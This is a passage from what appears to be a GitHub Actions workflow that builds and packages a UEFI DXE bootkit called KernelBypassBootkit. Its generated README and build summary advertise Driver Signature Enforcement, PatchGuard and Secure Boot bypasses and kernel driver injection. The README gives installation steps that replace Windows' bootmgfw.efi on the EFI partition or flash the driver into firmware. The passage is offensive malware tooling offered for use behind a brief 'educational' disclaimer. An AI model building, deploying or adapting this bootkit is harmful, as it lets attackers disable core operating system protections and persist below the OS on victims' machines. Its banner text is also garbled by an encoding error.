            KernelBypassPkg/Bootkit/Bootkit.inf
          EOF
          
          # INF file
          cat > $PKG_DIR/Bootkit/Bootkit.inf << 'EOF'
          [Defines]
            INF_VERSION                    = 0x00010005
            BASE_NAME                      = KernelBypassBootkit
            FILE_GUID                      = ABCD1234-ABCD-ABCD-ABCD-ABCD12345678
            MODULE_TYPE                    = DXE_DRIVER
            VERSION_STRING                 = 1.0
            ENTRY_POINT                    = BootkitEntry
          
          [Sources]
            Bootkit.c
          
          [Packages]
            MdePkg/MdePkg.dec
          
          [LibraryClasses]
            UefiDriverEntryPoint
            UefiBootServicesTableLib
            UefiRuntimeServicesTableLib
            UefiLib
            DebugLib
            MemoryAllocationLib
            BaseMemoryLib
          
          [Protocols]
            gEfiLoadedImageProtocolGuid
          
          [Depex]
            TRUE
          EOF
          
          # DEC file
          cat > $PKG_DIR/KernelBypassPkg.dec << 'EOF'
          [Defines]
            DEC_SPECIFICATION              = 0x00010005
            PACKAGE_NAME                   = KernelBypassPkg
            PACKAGE_GUID                   = 87654321-4321-4321-4321-CBA987654321
            PACKAGE_VERSION                = 1.0
          
          [Includes]
            Include
          EOF
          
          echo "âœ… Package files created"
          ls -la $PKG_DIR/

      - name: ðŸ”¨ Build Bootkit
        run: |
          echo ""
          echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
          echo "â•‘                    Building Ring -3 Bootkit                  â•‘"
          echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo ""
          
          cd ~/edk2
          source edksetup.sh
          
          BUILD_TYPE="${{ github.event.inputs.build_type || 'release' }}"
          BUILD_TARGET=$(echo "$BUILD_TYPE" | tr '[:lower:]' '[:upper:]')
          
          echo "Build target: $BUILD_TARGET"
          echo ""
          
          build -a X64 -t GCC5 -p KernelBypassPkg/KernelBypassPkg.dsc -b $BUILD_TARGET -j$(nproc)
          
          echo ""
          echo "âœ… Build completed!"

      - name: âœ… Collect Artifacts
        run: |
          echo ""
          echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
          echo "â•‘                    BUILD RESULTS                             â•‘"
          echo "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£"
          
          mkdir -p $GITHUB_WORKSPACE/output
          
          # Find and copy EFI file
          EFI_FILE=$(find ~/edk2/Build -name "*.efi" -type f 2>/dev/null | head -1)
          
          if [ -n "$EFI_FILE" ] && [ -f "$EFI_FILE" ]; then
            SIZE=$(du -h "$EFI_FILE" | cut -f1)
            echo "â•‘  âœ… KernelBypassBootkit.efi ($SIZE)"
            cp "$EFI_FILE" $GITHUB_WORKSPACE/output/KernelBypassBootkit.efi
          else
            echo "â•‘  âŒ EFI file not found!"
            exit 1
          fi
          
          # Copy source
          mkdir -p $GITHUB_WORKSPACE/output/source
          cp -r ~/edk2/KernelBypassPkg/* $GITHUB_WORKSPACE/output/source/
          
          # Copy project source
          cp -r kernel/ring_minus3 $GITHUB_WORKSPACE/output/ring_minus3 2>/dev/null || true
          cp -r kernel/ring_minus2 $GITHUB_WORKSPACE/output/ring_minus2 2>/dev/null || true
          cp -r kernel/common $GITHUB_WORKSPACE/output/common 2>/dev/null || true
          
          # Create README
          cat > $GITHUB_WORKSPACE/output/README.md << 'EOF'
          # Ring -3 UEFI Bootkit
          
          ## Files
          
          - `KernelBypassBootkit.efi` - Compiled DXE driver
          - `source/` - EDK2 package source
          - `ring_minus3/` - Project source code
          
          ## Features
          
          - âœ… DSE (Driver Signature Enforcement) bypass
          - âœ… PatchGuard initialization bypass
          - âœ… Kernel driver injection support
          - âœ… Secure Boot bypass
          
          ## Installation Methods
          
          ### Method 1: ESP Install (Recommended for testing)
          
          1. Mount EFI System Partition
          2. Backup original `EFI/Microsoft/Boot/bootmgfw.efi`
          3. Rename bootmgfw.efi to bootmgfw_original.efi
          4. Copy KernelBypassBootkit.efi as bootmgfw.efi
          5. Modify bootkit to chainload original
          
          ### Method 2: UEFI Shell
          
          1. Boot to UEFI Shell
          2. Navigate to EFI partition
          3. Run: `load KernelBypassBootkit.efi`
          
          ### Method 3: Firmware Integration
          
          1. Use UEFITool to open firmware image
          2. Insert DXE driver into DXE volume
          3. Flash modified firmware
          
          ## âš ï¸ WARNING
          
          - **NEVER test on production hardware!**
          - Use a VM (QEMU with OVMF) for testing
          - Keep SPI programmer ready for recovery
          - Firmware modification can permanently brick hardware!
          
          ## Testing with QEMU
          
          ```bash
          # Download OVMF
          sudo apt install ovmf
          
          # Create test disk
          qemu-img create -f qcow2 test.qcow2 10G
          
          # Run with EFI
          qemu-system-x86_64 \
            -bios /usr/share/OVMF/OVMF_CODE.fd \
            -drive file=test.qcow2,format=qcow2 \
            -m 4G \
            -enable-kvm
          ```
          
          ## Legal Disclaimer
          
          This software is for educational and research purposes only.
          Using this on systems you don't own is illegal.
          EOF
          
          echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo ""
          echo "Output contents:"
          ls -la $GITHUB_WORKSPACE/output/

      - name: ðŸ“¦ Upload Bootkit
        uses: actions/upload-artifact@v4
        with:
          name: Ring-Minus3-Bootkit-${{ github.run_number }}
          path: output/
          retention-days: 30

  # ============================================
  # Optional: Usermode Library
  # ============================================
  build-usermode:
    name: ðŸ“¦ Usermode Library
    runs-on: windows-latest
    if: ${{ github.event.inputs.include_usermode == 'true' }}
    
    steps:
      - name: ðŸ“¥ Checkout
        uses: actions/checkout@v4
      
      - name: ðŸ”§ Setup MSVC
        uses: ilammy/msvc-dev-cmd@v1
        with:
          arch: x64
      
      - name: âš¡ Setup Ninja
        uses: seanmiddleditch/gha-setup-ninja@v5
      
      - name: ðŸ”¨ Build
        working-directory: kernel/usermode
        run: |
          cmake -B build -G Ninja -DCMAKE_BUILD_TYPE=Release
          cmake --build build --config Release --parallel
      
      - name: ðŸ“¦ Upload
        uses: actions/upload-artifact@v4
        with:
          name: Usermode-Library-${{ github.run_number }}
          path: |
            kernel/usermode/build/**/*.lib
            kernel/usermode/build/**/*.exe
            kernel/usermode/include/*.hpp
            kernel/common/*.h
          retention-days: 30

  # ============================================
  # Summary
  # ============================================
  summary:
    name: ðŸ“Š Build Summary
    runs-on: ubuntu-latest
    needs: [build-ring-minus3]
    if: always()
    
    steps:
      - name: ðŸ“Š Summary
        run: |
          echo ""
          echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
          echo "â•‘         KERNEL BYPASS FRAMEWORK - Ring -3 Build              â•‘"
          echo "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£"
          echo "â•‘                                                              â•‘"
          echo "â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—        â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—               â•‘"
          echo "â•‘   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•       â•šâ•â•â•â•â–ˆâ–ˆâ•—              â•‘"
          echo "â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•              â•‘"
          echo "â•‘   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â•šâ•â•â•â•â• â•šâ•â•â•â–ˆâ–ˆâ•—              â•‘"
          echo "â•‘   â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•              â•‘"
          echo "â•‘   â•šâ•â•  â•šâ•â•â•šâ•â•â•šâ•â•  â•šâ•â•â•â• â•šâ•â•â•â•â•â•       â•šâ•â•â•â•â•â•               â•‘"
          echo "â•‘                                                              â•‘"
          echo "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£"
          echo "â•‘                                                              â•‘"
          echo "â•‘  Build Result: ${{ needs.build-ring-minus3.result }}"
          echo "â•‘                                                              â•‘"
          echo "â•‘  Artifact: Ring-Minus3-Bootkit-${{ github.run_number }}"
          echo "â•‘                                                              â•‘"
          echo "â•‘  Contents:                                                   â•‘"
          echo "â•‘    â€¢ KernelBypassBootkit.efi - UEFI DXE driver              â•‘"
          echo "â•‘    â€¢ Source code for customization                          â•‘"
          echo "â•‘    â€¢ Installation documentation                             â•‘"
          echo "â•‘                                                              â•‘"
          echo "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£"
          echo "â•‘                                                              â•‘"
          echo "â•‘  Features:                                                   â•‘"
          echo "â•‘    âœ… DSE Bypass                                            â•‘"
          echo "â•‘    âœ… PatchGuard Bypass                                     â•‘"
          echo "â•‘    âœ… Secure Boot Bypass                                    â•‘"
          echo "â•‘    âœ… Kernel Driver Injection                               â•‘"
          echo "â•‘                                                              â•‘"
          echo "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£"
          echo "â•‘                                                              â•‘"
          echo "â•‘  âš ï¸  Test in VM only! Can brick hardware!                   â•‘"
          echo "â•‘                                                              â•‘"
          echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo ""
